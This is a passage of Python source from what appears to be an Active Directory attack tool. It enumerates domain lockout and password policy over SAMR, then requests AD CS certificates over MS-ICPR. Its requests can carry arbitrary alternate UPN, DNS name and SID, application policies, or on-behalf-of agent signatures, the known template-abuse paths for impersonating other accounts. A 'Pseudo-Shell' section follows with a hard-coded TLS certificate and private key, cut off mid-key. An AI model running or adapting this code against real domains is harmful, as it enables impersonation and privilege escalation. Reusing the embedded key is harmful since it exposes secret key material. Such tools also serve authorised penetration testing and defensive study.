	# Domain fields: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/d275ab19-10b0-40e0-94bb-45b7fc130025
	
	res = samr.hSamrQueryInformationDomain2(dce, domainHandle, domainInformationClass = samr.DOMAIN_INFORMATION_CLASS.DomainGeneralInformation2)
	lockoutDuration = windowsFileTimeToTimedelta(res['Buffer']['General2']['LockoutDuration'])
	lockoutObservationWindow = windowsFileTimeToTimedelta(res['Buffer']['General2']['LockoutObservationWindow'])
	lockoutThreshold = res['Buffer']['General2']['LockoutThreshold']
	lockoutThreshold = lockoutThreshold if lockoutThreshold != 0 else 'Never'
	forceLogoff = windowsFileTimeToTimedelta((res['Buffer']['General2']['I1']['ForceLogoff']['HighPart'] << 32) + res['Buffer']['General2']['I1']['ForceLogoff']['LowPart'])
	oemInformation = res['Buffer']['General2']['I1']['OemInformation']
	domainName = res['Buffer']['General2']['I1']['DomainName']
	replicaSourceNodeName = res['Buffer']['General2']['I1']['ReplicaSourceNodeName']
	domainModifiedCount = (res['Buffer']['General2']['I1']['DomainModifiedCount']['HighPart'] << 32) + res['Buffer']['General2']['I1']['DomainModifiedCount']['LowPart']
	domainServerState = samr.DOMAIN_SERVER_ENABLE_STATE.enumItems(res['Buffer']['General2']['I1']['DomainServerState']).name
	domainServerRole = samr.DOMAIN_SERVER_ROLE.enumItems(res['Buffer']['General2']['I1']['DomainServerRole']).name
	uasCompatibilityRequired = res['Buffer']['General2']['I1']['UasCompatibilityRequired']
	userCount = res['Buffer']['General2']['I1']['UserCount']
	groupCount = res['Buffer']['General2']['I1']['GroupCount']
	aliasCount = res['Buffer']['General2']['I1']['AliasCount']
	
	res = samr.hSamrQueryInformationDomain2(dce, domainHandle, domainInformationClass = samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
	minPasswordLength = res['Buffer']['Password']['MinPasswordLength']
	passwordHistoryLength = res['Buffer']['Password']['PasswordHistoryLength'] 
	passwordProperties = res['Buffer']['Password']['PasswordProperties']
	maxPasswordAge = windowsFileTimeToTimedelta((res['Buffer']['Password']['MaxPasswordAge']['HighPart'] << 32) + res['Buffer']['Password']['MaxPasswordAge']['LowPart'])
	minPasswordAge = windowsFileTimeToTimedelta((res['Buffer']['Password']['MinPasswordAge']['HighPart'] << 32) + res['Buffer']['Password']['MinPasswordAge']['LowPart'])

	print('[+] Domain'.ljust(60), domainName)
	print('[+] Domain server state'.ljust(60), domainServerState)
	print('[+] Total users'.ljust(60), userCount)
	print('[+] Total groups'.ljust(60), groupCount)
	print('[+] Total aliases'.ljust(60), aliasCount)
	print('[+] Computer role'.ljust(60), domainServerRole)

	print('[+] Force user logoff how long after time expires?'.ljust(60), forceLogoff)
	print('[+] Minimum password age'.ljust(60), minPasswordAge)
	print('[+] Maximum password age'.ljust(60), maxPasswordAge)
	print('[+] Minimum password length'.ljust(60), minPasswordLength)
	print('[+] Length of password history maintained'.ljust(60), passwordHistoryLength)
	print('[+] Lockout threshold'.ljust(60), lockoutThreshold)
	print('[+] Lockout duration'.ljust(60), lockoutDuration)
	print('[+] Lockout observation window'.ljust(60), lockoutObservationWindow)
	print('[+] Password properties') # https://ldapwiki.com/wiki/Wiki.jsp?page=PwdProperties
	print("\t[+] Domain Password Complexity".ljust(53), (passwordProperties & 1) != 0)
	print("\t[+] Domain Password No Anon Change".ljust(53), (passwordProperties & 2) != 0)
	print("\t[+] Domain Lockout Admins".ljust(53), (passwordProperties & 8) != 0)
	print("\t[+] Domain Password Store Cleartext".ljust(53), (passwordProperties & 16) != 0)
	print("\t[+] Domain Refuse Password Change".ljust(53), (passwordProperties & 32) != 0)

########################################################
#   [MS-ICPR] = ICertPassage Remote Protocol options   #
#               Interface = ICertPassage               #
########################################################

from asn1crypto import cms as asn1cms, core as asn1core, csr as asn1csr, x509 as asn1x509
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.serialization import (
	Encoding,
	NoEncryption,
	PrivateFormat,
	PublicFormat,
	pkcs12,
)
from cryptography.x509.oid import NameOID

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
NTDS_CA_SECURITY_EXT = x509.ObjectIdentifier("1.3.6.1.4.1.311.25.2")
NTDS_OBJECTSID = x509.ObjectIdentifier("1.3.6.1.4.1.311.25.2.1")

szOID_RENEWAL_CERTIFICATE = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.13.1")
szOID_ENCRYPTED_KEY_HASH = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.21.21")
szOID_PRINCIPAL_NAME = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
szOID_ENCRYPTED_KEY_HASH = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.21.21")
szOID_CMC_ADD_ATTRIBUTES = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.10.10.1")
szOID_NTDS_CA_SECURITY_EXT = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.25.2")
szOID_NTDS_OBJECTSID = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.25.2.1")

class DCERPCSessionErrorICPR(rpcrt.DCERPCException):
	def __init__(self, error_string = None, error_code = None, packet = None):
		rpcrt.DCERPCException.__init__(self, error_string, error_code, packet)

	def __str__(self):
		key = self.error_code
		if key in ErrorsUtil.HRESULT_ERROR_MESSAGES:
			error_msg_short = ErrorsUtil.HRESULT_ERROR_MESSAGES[key][0]
			error_msg_verbose = ErrorsUtil.HRESULT_ERROR_MESSAGES[key][1]
			return 'ICPR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
		elif key & 0xffff in ErrorsUtil.SYSTEM_ERROR_MESSAGES:
			error_msg_short = ErrorsUtil.SYSTEM_ERROR_MESSAGES[key & 0xffff][0]
			error_msg_verbose = ErrorsUtil.SYSTEM_ERROR_MESSAGES[key & 0xffff][1]
			return 'ICPR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
		else:
			return 'ICPR SessionError: unknown error code: 0x%x' % self.error_code

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/d6bee093-d862-4122-8f2b-7b49102097dc
class CERTTRANSBLOB(ndr.NDRSTRUCT):
	structure = (
		("cb", dtypes.ULONG),
		("pb", dtypes.PBYTE)
	)

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
class CertServerRequest(ndr.NDRCALL):
	opnum = 0
	structure = (
		("dwFlags", dtypes.DWORD),
		("pwszAuthority", dtypes.LPWSTR),
		("pdwRequestId", dtypes.DWORD),
		("pctbAttribs", CERTTRANSBLOB),
		("pctbRequest", CERTTRANSBLOB)
	)

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
class CertServerRequestResponse(ndr.NDRCALL):
	structure = (
		("pdwRequestId", dtypes.DWORD),
		("pdwDisposition", dtypes.ULONG),
		("pctbCert", CERTTRANSBLOB),
		("pctbEncodedCert", CERTTRANSBLOB),
		("pctbDispositionMessage", CERTTRANSBLOB)
	)

class EnrollmentNameValuePair(asn1core.Sequence):
	_fields = [
		("name", asn1core.BMPString),
		("value", asn1core.BMPString),
	]

def hashDigest(data, hash):
	digest = hashes.Hash(hash())
	digest.update(data)
	return digest.finalize()

def createCSR(username, altDNS = None, altUPN = None, altSID = None, key = None, keySize = 2048, subject = None, renewalCert = None, applicationPoliciesOID = None):
	if key is None:
		key = rsa.generate_private_key(public_exponent = 0x10001, key_size = keySize)

	# csr = asn1csr.CertificationRequest()
	certification_request_info = asn1csr.CertificationRequestInfo()
	certification_request_info["version"] = "v1"
	# csr = x509.CertificateSigningRequestBuilder()

	if subject:
		subject_name = x509.Name(x509.Name.from_rfc4514_string(subject).rdns[::-1])
	else:
		subject_name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, username.capitalize())])

	certification_request_info["subject"] = asn1csr.Name.load(subject_name.public_bytes())
	public_key = key.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
	subject_pk_info = asn1csr.PublicKeyInfo.load(public_key)
	certification_request_info["subject_pk_info"] = subject_pk_info
	cri_attributes = []
	if altDNS or altUPN:
		general_names = []

		if altDNS:
			if type(altDNS) == bytes:
				altDNS = altDNS.decode()
			general_names.append(asn1x509.GeneralName({"dns_name": altDNS}))

		if altUPN:
			if type(altUPN) == bytes:
				altUPN = altUPN.decode()
			general_names.append(asn1x509.GeneralName({"other_name": asn1x509.AnotherName({"type_id": szOID_PRINCIPAL_NAME, "value": asn1x509.UTF8String(altUPN).retag({"explicit": 0})})}))

		san_extension = asn1x509.Extension({"extn_id": "subject_alt_name", "extn_value": general_names})
		set_of_extensions = asn1csr.SetOfExtensions([[san_extension]])
		cri_attribute = asn1csr.CRIAttribute({"type": "extension_request", "values": set_of_extensions})
		cri_attributes.append(cri_attribute)

	if altSID:
		if type(altSID) == str:
			altSID = altSID.encode()
		san_extension = asn1x509.Extension({"extn_id": "security_ext", "extn_value": [asn1x509.GeneralName({"other_name": asn1x509.AnotherName({"type_id": szOID_NTDS_OBJECTSID, "value": asn1x509.OctetString(altSID).retag({"explicit": 0})})})]})
		set_of_extensions = asn1csr.SetOfExtensions([[san_extension]])
		cri_attribute = asn1csr.CRIAttribute({"type": "extension_request", "values": set_of_extensions})
		cri_attributes.append(cri_attribute)

	if renewalCert:
		cri_attributes.append(asn1csr.CRIAttribute({"type": "1.3.6.1.4.1.311.13.1", "values": asn1x509.SetOf([asn1x509.Certificate.load(renewalCert.public_bytes(Encoding.DER))], spec = asn1x509.Certificate)}))

	# Add Microsoft Application Policies (Windows-specific)
	if applicationPoliciesOID:
		# Convert each policy OID string to asn1x509.PolicyIdentifier
		application_policy_oids = [asn1x509.PolicyInformation({'policy_identifier': asn1x509.PolicyIdentifier(ap)}) for ap in applicationPoliciesOID]

		# Convert CertificatePolicies to a DER-encoded byte string
		cert_policies = asn1x509.CertificatePolicies(application_policy_oids)
		der_encoded_cert_policies = cert_policies.dump()
		
		app_policy_extension = asn1x509.Extension(
			{
				"extn_id": "1.3.6.1.4.1.311.21.10",  # OID for Microsoft Application Policies
				"critical": False,
				"extn_value": asn1x509.ParsableOctetString(der_encoded_cert_policies)
			}
		)

		set_of_extensions = asn1csr.SetOfExtensions([[app_policy_extension]])
		cri_attribute = asn1csr.CRIAttribute({"type": "extension_request", "values": set_of_extensions})
		cri_attributes.append(cri_attribute)
	
	certification_request_info["attributes"] = cri_attributes

	signature = key.sign(certification_request_info.dump(), padding.PKCS1v15(), hashes.SHA256())

	csr = asn1csr.CertificationRequest({"certification_request_info": certification_request_info, "signature_algorithm": asn1csr.SignedDigestAlgorithm({"algorithm": "sha256_rsa"}), "signature": signature})

	return (x509.load_der_x509_csr(csr.dump()), key)

def createRenewal(request, cert, key):
	x509_cert = asn1x509.Certificate.load(cert.public_bytes(Encoding.DER))
	signature_hash_algorithm = cert.signature_hash_algorithm.__class__

	# SignerInfo

	issuer_and_serial = asn1cms.IssuerAndSerialNumber({"issuer": x509_cert.issuer, "serial_number": x509_cert.serial_number})
	digest_algorithm = asn1cms.DigestAlgorithm({"algorithm": signature_hash_algorithm.name})
	signed_attribs = asn1cms.CMSAttributes([asn1cms.CMSAttribute({"type": "1.3.6.1.4.1.311.13.1", "values": asn1cms.SetOfAny([asn1x509.Certificate.load(cert.public_bytes(Encoding.DER))], spec = asn1x509.Certificate)}), asn1cms.CMSAttribute({"type": "message_digest", "values": [hashDigest(request, signature_hash_algorithm)]})])
	attribs_signature = key.sign(signed_attribs.dump(), padding.PKCS1v15(), signature_hash_algorithm())
	signer_info = asn1cms.SignerInfo({"version": 1, "sid": issuer_and_serial, "digest_algorithm": digest_algorithm, "signature_algorithm": x509_cert["signature_algorithm"], "signature": attribs_signature, "signed_attrs": signed_attribs})

	# SignedData

	content_info = asn1cms.EncapsulatedContentInfo({"content_type": "data", "content": request})
	signed_data = asn1cms.SignedData({"version": 3, "digest_algorithms": [digest_algorithm], "encap_content_info": content_info, "certificates": [asn1cms.CertificateChoices({"certificate": x509_cert})], "signer_infos": [signer_info]})

	# CMC

	cmc = asn1cms.ContentInfo({"content_type": "signed_data", "content": signed_data})

	return cmc.dump()

def createOnBehalfOf(request, onBehalfOf, cert, key):
	x509_cert = asn1x509.Certificate.load(cert.public_bytes(Encoding.DER))
	signature_hash_algorithm = cert.signature_hash_algorithm.__class__

	# SignerInfo

	issuer_and_serial = asn1cms.IssuerAndSerialNumber({"issuer": x509_cert.issuer, "serial_number": x509_cert.serial_number})
	digest_algorithm = asn1cms.DigestAlgorithm({"algorithm": signature_hash_algorithm.name})
	requester_name = EnrollmentNameValuePair({"name": "requestername\x00", "value": onBehalfOf if onBehalfOf[-1] == "\x00" else onBehalfOf + "\x00",})
	signed_attribs = asn1cms.CMSAttributes([asn1cms.CMSAttribute({"type": "1.3.6.1.4.1.311.13.2.1", "values": [requester_name]}), asn1cms.CMSAttribute({"type": "message_digest", "values": [hashDigest(request, signature_hash_algorithm)]})])
	attribs_signature = key.sign(signed_attribs.dump(), padding.PKCS1v15(), signature_hash_algorithm())
	signer_info = asn1cms.SignerInfo({"version": 1, "sid": issuer_and_serial, "digest_algorithm": digest_algorithm, "signature_algorithm": x509_cert["signature_algorithm"], "signature": attribs_signature, "signed_attrs": signed_attribs})

	# SignedData

	content_info = asn1cms.EncapsulatedContentInfo({"content_type": "data", "content": request})
	signed_data = asn1cms.SignedData({"version": 3, "digest_algorithms": [digest_algorithm], "encap_content_info": content_info, "certificates": [asn1cms.CertificateChoices({"certificate": x509_cert})], "signer_infos": [signer_info]})

	# CMC

	cmc = asn1cms.ContentInfo({"content_type": "signed_data", "content": signed_data})

	return cmc.dump()

def getObjectSIDFromCertificate(cert):
	try:
		objectSID = cert.extensions.get_extension_for_oid(NTDS_CA_SECURITY_EXT)
		sid = objectSID.value.value
		return sid[sid.find(b"S-1-5"):].decode()
	except:
		pass

	return None

def getError(errorCode):
	errorCode &= 0xFFFFFFFF
	if errorCode in ErrorsUtil.HRESULT_ERROR_MESSAGES:
		error_msg_short = ErrorsUtil.HRESULT_ERROR_MESSAGES[errorCode][0]
		error_msg_verbose = ErrorsUtil.HRESULT_ERROR_MESSAGES[errorCode][1]
		return "[-] Got error: 0x%x - %s - %s" % (errorCode, error_msg_short, error_msg_verbose)
	else:
		return "[-] Got error: 0x%x. Check MS-ERREF" % errorCode

def requestCertificate(ip, user, pwd, domain, nthash, aesKey, ccache, templateName, caName, outFile, renew = False, onBehalfOf = None, pfxFile = None, pfxPwd = None, subject = None, altDNS = None, altUPN = None, altSID = None, archiveKey = False, keySize = 2048, applicationPolicies = None, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	###

	print_yellow("[*] Requesting ADCS certificate")
	print_yellow("---")
	print()

	try:
		global DCERPCSessionError
		DCERPCSessionError = DCERPCSessionErrorICPR
  
		if (not templateName or not caName or not outFile):
			print("[-] Template name, CA name and output file name required")
			return
	
		# Create the Certificate Signing Request (CSR)

		if onBehalfOf:
			username = onBehalfOf
		else:
			username = user.upper()
		
		renewalCert = None
		renewalKey = None
		if renew:
			if pfxFile is None:
				print(f"[-] PFX certificate not provided for renewal")
				return
			with open(pfxFile, "rb") as f:
				renewalKey, renewalCert = pkcs12.load_key_and_certificates(f.read(), pfxPwd)
		
		applicationPoliciesOID = None
		if applicationPolicies:
			applicationPoliciesOID = []
			applicationPolicies = applicationPolicies.split(',')
			for policy in applicationPolicies:
				oid = next((k for k, v in LDAPUtil.OID_TO_STR_MAP.items() if v.lower() == policy.lower()), policy)
				applicationPoliciesOID.append(oid)

		csr, key = createCSR(username, altDNS = altDNS, altUPN = altUPN, altSID = altSID, key = None, keySize = keySize, subject = subject, renewalCert = renewalCert, applicationPoliciesOID = applicationPoliciesOID)
		csr = csr.public_bytes(Encoding.DER)
		
		if archiveKey:
			print("[-] TODO")
			return
		
		if renew:
			csr = createRenewal(csr, renewalCert, renewalKey)
		
		if onBehalfOf:
			if pfxFile is None:
				print(f"[-] PFX certificate not provided for request on behalf of another user")
				return
			with open(pfxFile, "rb") as f:
				agentKey, agentCert = pkcs12.load_key_and_certificates(f.read(), pfxPwd)[:-1]
			csr = createOnBehalfOf(csr, onBehalfOf, agentCert, agentKey)
		
		# Create the attributes

		attributes = [f"CertificateTemplate:{templateName}"]
		if altUPN or altDNS:
			san = []
			if altDNS:
				san.append(f"dns={altDNS}")
			if altUPN:
				san.append(f"upn={altUPN}")
			attributes.append("SAN:%s" % "&".join(san))
		if applicationPoliciesOID:
			policyString = "&".join(applicationPoliciesOID)
			attributes.append(f"ApplicationPolicies:{policyString}")

		# Connect to the ICertPassage interface

		try:
			# Connect to the ICertPassage interface through named pipe
			if alternateBinding == None:
				rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\cert]' % ip)
			else:
				rpctransport = transport.DCERPCTransportFactory(alternateBinding)
			if not unauthTransport:
				if (aesKey != None or ccache != None):
					rpctransport._doKerberos = True
					if (ccache != None):
						import os
						os.environ["KRB5CCNAME"] = ccache
				rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
			dce = rpctransport.get_dce_rpc()
			dce.connect()
			dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
			if not unauthTransport:
				if (aesKey != None or ccache != None):
					dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
			if alternateInterface == None:
				dce.bind(UUIDTupToBin(('91AE6020-9E3C-11CF-8D7C-00AA00C091BE','0.0')))
			else:
				dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
		except Exception as e:
			try:
				# Connect to the EPMAPPER interface
				rpctransport = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:%s' % ip)
				dce = rpctransport.get_dce_rpc()
				dce.connect()
				dynamicStrBinding = epm.hept_map(ip, UUIDTupToBin(('91AE6020-9E3C-11CF-8D7C-00AA00C091BE','0.0')), protocol = "ncacn_ip_tcp", dce = dce)
				# hept_map: Bind to the EPMAPPER interface and search the string binding for the ICertPassage interface through TCP

				# Connect to the ICertPassage interface through dynamic endpoint
				if alternateBinding == None:
					rpctransport = transport.DCERPCTransportFactory(dynamicStrBinding)
				else:
					rpctransport = transport.DCERPCTransportFactory(alternateBinding)
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						rpctransport._doKerberos = True
						if (ccache != None):
							import os
							os.environ["KRB5CCNAME"] = ccache
					rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
				dce = rpctransport.get_dce_rpc()
				dce.connect()
				dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
				if not unauthTransport:
					if (aesKey != None or ccache != None):
						dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
				if alternateInterface == None:
					dce.bind(UUIDTupToBin(('91AE6020-9E3C-11CF-8D7C-00AA00C091BE','0.0')))
				else:
					dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))
			except Exception as e:
				print("[-] Failed to connect to the ICertPassage interface through named pipe and dynamic endpoint", file = sys.stderr)
				raise e
		
		# Request the certificate through the ICertPassage interface

		attributes = "\n".join(attributes)
		attributes += "\x00" if attributes[-1] != "\x00" else ""
		attributes = attributes.encode("utf-16le")
		pctb_attribs = CERTTRANSBLOB()
		pctb_attribs["cb"] = len(attributes)
		pctb_attribs["pb"] = attributes

		pctb_request = CERTTRANSBLOB()
		pctb_request["cb"] = len(csr)
		pctb_request["pb"] = csr

		request = CertServerRequest()
		request["dwFlags"] = 0
		request["pwszAuthority"] = caName if caName[-1] == "\x00" else caName + "\x00"
		request["pdwRequestId"] = 0
		request["pctbAttribs"] = pctb_attribs
		request["pctbRequest"] = pctb_request

		response = dce.request(request)

		errorCode = response["pdwDisposition"]
		requestID = response["pdwRequestId"]
		failed = True

		# Check the error code

		if errorCode == 3:
			print("[+] Successfully requested certificate")
			failed = False
		else:
			if errorCode == 5:
				print("[-] Certificate request is pending approval", file = sys.stderr)
			else:
				print(getError(errorCode), file = sys.stderr)

		print(f"[+] Request ID = {requestID}")

		if errorCode != 3:
			with open(f"{requestID}.key", "wb") as f:
				keyPEM = key.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, encryption_algorithm = NoEncryption())
				f.write(keyPEM)
				print(f"[+] Saved PEM private key to {outFile.split('.')[0]}.key")

		if failed:
			return

		# Retrieve the certificate

		cert = x509.load_der_x509_certificate(b"".join(response["pctbEncodedCert"]["pb"]))

		if subject:
			subject = ",".join(map(lambda x: x.rfc4514_string(), cert.subject.rdns))
			print(f"[+] Got certificate with subject = {subject}")

		objectSID = getObjectSIDFromCertificate(cert)
		if objectSID is not None:
			print(f"[+] Certificate object SID = {repr(objectSID)}")
		else:
			print("[+] Certificate has no object SID")

		pfx = pkcs12.serialize_key_and_certificates(name = b"", key = key, cert = cert, cas = None, encryption_algorithm = NoEncryption())
		with open(outFile, "wb") as f:
			f.write(pfx)

		print(f"[+] Saved PFX certificate and private key to '{outFile}' (No password)")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def retrieveCertificate():
	pass

##########################################################
#                     Pseudo-Shell                       #
##########################################################

finalData = ''
insideBlock = False
output = ''
haveOutput = False
stopEvent = threading.Event()
sThread = None
sslCert = '''-----BEGIN CERTIFICATE-----
MIIFazCCA1OgAwIBAgIUG3Y/N+u4VWeCrio18udhm0Y7UnQwDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA4MTcwNDI4MzVaFw0yNTA4
MTcwNDI4MzVaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
AQUAA4ICDwAwggIKAoICAQC/YWhftscXODVentz1ma5Be2XnoeB+Yf4NLvROP6TS
/neLkLqrzNnT/ZO1kH1lD6Ps7ivwv1L2Tv3CWbNWFmA3u2B0gV+YU66yeMG8Qcgg
9PH5OIxP88tstlxIJMC0xywuLXpjSHRFKDQJuOftX7pacd+Vs4Q/gZSRLlBLK6PQ
/WQXu/DvUvafjTjEpIa7tIVLnbqUTuuOs0vUoGp5URVUtXkvIAJFok2ix4TyJZZy
sM5xt5MK4fbroglVbr2N32wrNcwGsXoAFhuBuwWU1r5fcvBO1LyFD/Ykah8FDuo/
8gaze62/XuPjeNUwloHJFbs3zDaSTVQjpbeORzpPHDF67/zqrz08Avx/GX8T6I0N
P6/0Q8eVglcBXkddC9W7NFJNMPS/ujWpfa/um35TKuvpT1Zxa2LorCLlpCydsXJ7
/YqKcLBVCNnTQdGV3miXK04EIxgLZ0zBJxC4BfR/j9eTm9f1fmfuJxfwWmH6CwY8
2y8v+7BIHKIVgGp0/FSCL4wU4UoJ36kI+lFRvTIWRGnwp/Rm4tWU0u9bcbpkluGm
6kMZkJifIGN44/Ac1s+rJzGud75ojDpUJLurz/lPnfJCty8d8gyhKg47VInrIE6+
BscXB/4K1h36V5rmPnEd+7ghAYM7Yh1wKAWzkqwBFCbOpWonuTMWpx8zsV347a17
xQIDAQABo1MwUTAdBgNVHQ4EFgQUm162tQgFY3JjulPycuu0hdx8zyYwHwYDVR0j
BBgwFoAUm162tQgFY3JjulPycuu0hdx8zyYwDwYDVR0TAQH/BAUwAwEB/zANBgkq
hkiG9w0BAQsFAAOCAgEAlxCmfaY/MDAVRDND3ai/tz3WLRQEZy9R2iWiBrVOqabO
zyKRoXE5V1eyW6OXEJ5JYDAImlYs8COVmFaaRzl7mrH23Povz+ONVpnkYTFOjBlO
Czvq+rKIoW9SBYM85wHhOHc44uzVL+fv34bJu//+3V8ZGhuuNlhKFkZkRU1yhrSB
zXlJy58oa97hNenxpnXZlAYJq32r6TEP0YbdjXQrKXPO+nqY3X7m2qHKyB6ipZYV
J+vtXuq04AdzDG1oHGF/WEheZJS3pOwQxsZjxR+GcXSjxXPWkwch1BZXH2u697l4
f5bxCtgboGZjdMAKuSjNeu/1m+3o9kple456U1G7ZIPp8eIH1slTVXPFqvgEXW/r
4WqBNLGRkfR7xsj3lPga0IU8nWWLbElE8Mmm+gr3ldydIteTXZgrj3DKNua/A5MQ
ql8Uq1Gh1avA7cMnRFRhudz2B7H/lXsVYmdeJi9rZYdiTie3J9iyVAqqWVc2gk1m
sKLpYOqLbUIrOdsf/3dRj7X6RnDLnNlhP5pIbDIT0Cb2RuKRV/W6YU4v3YWiF0XH
gd78aNrw8DreAd5P9Uj6pgSzxtUFE4diWulAccDCFWGxJe/pfiNDD+4I7EJTrqHy
SP3tCfdMRjlmuPrOc98F7wrjd7eohhWFDJGx4Q1dHissRU1NemXUV4i8kAdwzxA=
-----END CERTIFICATE-----'''
sslKey = '''-----BEGIN PRIVATE KEY-----
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
